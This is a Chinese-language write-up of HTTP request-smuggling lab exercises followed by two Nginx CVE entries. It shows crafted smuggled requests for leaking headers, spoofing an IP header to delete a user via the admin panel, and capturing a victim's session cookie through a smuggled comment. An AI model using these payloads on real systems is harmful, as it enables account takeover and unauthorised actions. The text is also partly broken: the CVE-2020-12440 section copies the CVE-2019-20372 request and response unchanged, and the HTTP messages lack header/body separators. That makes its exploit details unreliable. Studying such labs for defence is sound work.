### 优化后的文本

#### HTTP 请求走私攻击分析与利用

**1. 特殊参数处理**
- 将POST请求中找到的特殊参数放在消息末尾。
- 发送一个普通的请求，前端服务器对请求进行重写后，显示修改后的字段。

**2. 前后端服务器交互**
- 前端服务器在转发请求给后端服务器时，有时会添加一些请求头。利用HTTP Smuggling可以泄露这些请求头。
- 本题涉及前后端服务器，且前端服务器不支持分块编码（Chunked Encoding）。
- 题目要求删除一个用户，并提供了一个搜索框用于输入和抓包分析。

**3. 实验步骤与结果**
- 输入任意内容并抓包，发现请求方式为POST，包含search栏且网页有回显，符合条件：能够将请求参数值输出到响应中的POST请求。
- 尝试使用HTTP Smuggling访问，但未成功。
- 将`search`参数置于请求末尾，成功输出了重写的字段。

**4. 原理解析**
- 数据包示例：
  ```http
  POST / HTTP/1.1
  Content-Length: 99
  Content-Type: application/x-www-form-urlencoded
  search=123
  ```
  - `Content-Length` 设置为99，实际数据长度不足，导致后端服务器继续等待接收剩余数据。
  - 后续发送的数据包被后端服务器识别为完整请求，从而触发响应。
  - 接收的实际请求如下：
    ```http
    POST / HTTP/1.1
    Content-Length: 99
    Content-Type: application/x-www-form-urlencoded
    search=123POST / HTTP/1.1
    X-vNEiJW-Ip: 60.208.116.230
    Host: 0af50032039935cac09024a000f90051.web
    ```

**5. 直接添加请求头的问题**
- 直接添加`X-vNEiJW-Ip: 127.0.0.1`不会被识别，因为伪造的`X-vNEiJW-Ip`被服务器添加的同名请求头覆盖。
- 利用`Content-Length`截断服务器添加的header，成功访问admin并删除数据。

**6. 捕获其他用户的请求**
- 题目要求通过请求走私使下一个用户的请求存储在应用程序中，然后检索该请求并使用受害用户的cookie访问其账户。
- 发现评论功能可以保存并显示用户信息，构造smuggling请求以捕获其他用户的信息。
- 构造请求示例：
  ```http
  Transfer-Encoding: chunked
  0
  POST /post/comment HTTP/1.1
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 600
  Cookie: session=KNcf39DxFk6mablQsC1OtaXSs1ryF37z
  csrf=zqKh3HpJ0bsKnWNIaPjMmPnjig4efP22&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
  ```
- 用户访问频率较低，多次尝试后发现捕获到自己的cookie，表明存在靶场问题或用户访问速度较慢。

**7. Nginx漏洞分析**

##### CVE-2019-20372
- **描述**：Nginx 1.17.7之前的版本中，某些`error_page`配置允许HTTP请求走私，攻击者可在负载均衡器前端环境中读取未经授权的网页。
- **构造请求**：
  ```http
  GET /test.html HTTP/1.1
  Host: www.0-sec.org
  Content-Length: 2
  GET /poc.html HTTP/1.1
  Host: www.0-sec.org
  Content-Length: 15
  ```
- **服务器响应**：
  ```http
  HTTP/1.1 200 OK
  Server: nginx/1.18.0
  Date: Fri, 01 May 2020 18:28:44 GMT
  Content-Type: text/html
  Content-Length: 33
  Last-Modified: Thu, 30 Apr 2020 14:36:32 GMT
  Connection: keep-alive
  ETag: "5eaae270-21"
  Accept-Ranges: bytes
  Test Page!
  HTTP/1.1 200 OK
  Server: nginx/1.18.0
  Date: Fri, 01 May 2020 18:28:44 GMT
  Content-Type: text/html
  Content-Length: 15
  Last-Modified: Thu, 30 Apr 2020 14:35:41 GMT
  Connection: keep-alive
  ETag: "5eaae23d-f"
  Accept-Ranges: bytes
  NGINX PoC File
  ```

##### CVE-2020-12440
- **描述**：Nginx 1.18.0及之前版本中存在缓存投毒漏洞，攻击者可劫持凭证或绕过安全保护。
- **构造请求**：
  ```http
  GET /test.html HTTP/1.1
  Host: www.0-sec.org
  Content-Length: 2
  GET /poc.html HTTP/1.1
  Host: www.0-sec.org
  Content-Length: 15
  ```
- **服务器响应**：
  ```http
  HTTP/1.1 200 OK
  Server: nginx/1.18.0
  Date: Fri, 01 May 2020 18:28:44 GMT
  Content-Type: text/html
  Content-Length: 33
  Last-Modified: Thu, 30 Apr 2020 14:36:32 GMT
  Connection: keep-alive
  ETag: "5eaae270-21"
  Accept-Ranges: bytes
  Test Page!
  HTTP/1.1 200 OK
  Server: nginx/1.18.0
  Date: Fri, 01 May 2020 18:28:44 GMT
  Content-Type: text/html
  Content-Length: 15
  Last-Modified: Thu, 30 Apr 2020 14:35:41 GMT
  Connection: keep-alive
  ETag: "5eaae23d-f"
  Accept-Ranges: bytes
  NGINX PoC File
  ```

**8. 结论**
- 通过上述实验和分析，展示了如何利用HTTP Smuggling攻击来泄露敏感信息和执行未授权操作。
- 对于Nginx漏洞，提供了具体的请求构造方法和响应分析，帮助理解漏洞的利用过程。